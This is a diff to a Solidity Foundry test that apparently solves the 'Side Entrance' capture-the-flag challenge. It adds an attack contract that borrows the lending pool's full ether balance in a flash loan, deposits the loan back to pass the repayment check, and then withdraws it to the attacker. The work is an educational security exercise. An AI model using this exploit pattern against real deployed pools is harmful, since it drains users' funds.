@@ -4,7 +4,36 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
-import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {
+    SideEntranceLenderPool,
+    IFlashLoanEtherReceiver
+} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {Address} from "openzeppelin-contracts/utils/Address.sol";
+
+contract AttackContruct is IFlashLoanEtherReceiver {
+    using Address for address payable;
+
+    SideEntranceLenderPool public pool;
+    address public owner;
+
+    constructor(SideEntranceLenderPool _pool, address _owner) {
+        pool = _pool;
+        owner = _owner;
+    }
+
+    function attack() public {
+        uint256 balance = address(pool).balance;
+        pool.flashLoan(balance);
+        pool.withdraw();
+        payable(owner).sendValue(balance);
+    }
+
+    receive() external payable {}
+
+    function execute() external payable override {
+        pool.deposit{value: msg.value}();
+    }
+}
 
 contract SideEntrance is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
@@ -13,6 +42,7 @@ contract SideEntrance is Test {
     SideEntranceLenderPool internal sideEntranceLenderPool;
     address payable internal attacker;
     uint256 public attackerInitialEthBalance;
+    AttackContruct public attackContruct;
 
     function setUp() public {
         utils = new Utilities();
@@ -21,6 +51,8 @@ contract SideEntrance is Test {
         vm.label(attacker, "Attacker");
 
         sideEntranceLenderPool = new SideEntranceLenderPool();
+        attackContruct = new AttackContruct(sideEntranceLenderPool, attacker);
+
         vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");
 
         vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);
@@ -32,10 +64,12 @@ contract SideEntrance is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitSideEntrance() public {
         /**
          * EXPLOIT START *
          */
+        vm.prank(attacker);
+        attackContruct.attack();
 
         /**
          * EXPLOIT END *
